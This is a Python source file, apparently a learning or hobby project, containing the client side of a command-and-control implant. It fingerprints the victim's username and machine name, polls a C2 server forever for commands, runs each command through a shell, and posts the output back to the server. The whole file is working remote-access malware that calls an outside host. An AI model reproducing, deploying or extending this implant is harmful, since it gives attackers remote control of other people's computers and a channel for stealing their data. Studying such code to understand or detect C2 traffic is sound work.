"""
Command & Control Client Side Coding
Author: Davood Yakuza
"""
from platform import system

# Import for Windows Builds only
if system() == "Windows":
    from os import getenv, chdir, path, getcwd

# Import for Linux Builds only
elif system() == "Linux":
    from os import getenv, uname, chdir, path, getcwd

# Import for both Linux & Windows Builds
from requests import get, exceptions, post
from time import time, sleep
from subprocess import run, PIPE, STDOUT

# Custom Features Import
from colorama import Fore


# Constants Import
from settings import CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PORT, PROXY, HEADERS

# If Client have Windows OS
if system() == "Windows":
    # For Windows obtain a unique identifying Information
    client = (getenv("USERNAME","Unknown-Username") + "@" +
              getenv("COMPUTERNAME","Unknown-Computer Name") + "@" + str(time()))

# Elif Client have Linux OS
elif system() == "Linux":
    # For Linux, get a unique identifying Information
    client = getenv("LOGNAME","Unknown-Username") + "@" + uname().nodename + "@" + str(time())

# If OS is not windows or linux, use a Linux version of the client
else:
    client = getenv("LOGNAME","Unknown-Username") + "@" + uname().nodename + "@" + str(time())

# Print C2 Client Side Message for avoid complexing in test operation
print(Fore.LIGHTMAGENTA_EX+"[+]-------------C2 Client Side-------------[+]"+Fore.RESET)

def post_to_server(message, response_path=RESPONSE):
    """function to post data to C2 Server, accept message and response path
	optional as arguments"""
    try:
        post(f"http://{C2_SERVER}:{PORT}{response_path}",
             data={RESPONSE_KEY:message},
             headers=HEADERS, proxies=PROXY)
    except exceptions.RequestException:
        return


#Better use infinity loop when add control active sessions feature in Server Side
while True:
    '''Try an http get requests to the C2 Server and retrieve command;
	if failed, Keep Trying forever.'''
    try:
        response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADERS, proxies=PROXY)

        # if we got 404 status codes, raise an exception to jump to except block
        if response.status_code == 404:
            raise exceptions.RequestException

    except exceptions.RequestException:
        #print(Fore.LIGHTRED_EX+"[-] C2 Server is down, try Reconnecting..."+Fore.RESET)
        try:
            sleep(DELAY)
            continue #jump to the last iteration of the loop(while True:)
        except KeyboardInterrupt:
            print(Fore.LIGHTMAGENTA_EX+"[*] User has been Interrupted the C2 Client Side"+Fore.RESET)
            exit()
    except KeyboardInterrupt:
        print(Fore.LIGHTMAGENTA_EX+"[*] User has been Interrupted the C2 Client Side"+Fore.RESET)
        exit()
    except Exception as e:
        print(Fore.LIGHTYELLOW_EX+"[!] Unknown Error when Sending Request to C2 Server"+Fore.RESET)
        print(f'Error Content: {e}')
        exit()

    # Retrieve the command from response and decode it 
    command = response.content.decode()

    # Check if the command is cd without any input path, change to home directory
    if len(command) == 2 and command == "cd":
        homeDirectory = path.expanduser("~")
        chdir(homeDirectory)

    # if the Command is cd follow below blocks, first check cd with an input path
    if command.startswith("cd "):
        directory = command[3:]

        try:
            chdir(directory)
        except FileNotFoundError:
            post_to_server(f"No such directory {directory}.\n")
        except NotADirectoryError:
            post_to_server(f"{directory} is not a directory")
        except PermissionError:
            post_to_server(f"You have don't Permission to Access{directory}.\n")
        except OSError:
            post_to_server("There was a Operation System Error on client.\n")
        else:
            post_to_server(getcwd(),CWD_RESPONSE)

    else:
        # Run command using subprocess.run module
        commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT)
        post_to_server(commandOutput.stdout)

    print("[+] Command Executed and Result send to C2 Server.")
    print(Fore.LIGHTBLUE_EX+str(response.status_code)+Fore.RESET)
    

print(Fore.LIGHTCYAN_EX+f"[+] Goodbye & Goodluck Ninja 🥷\n{client}"+Fore.RESET)



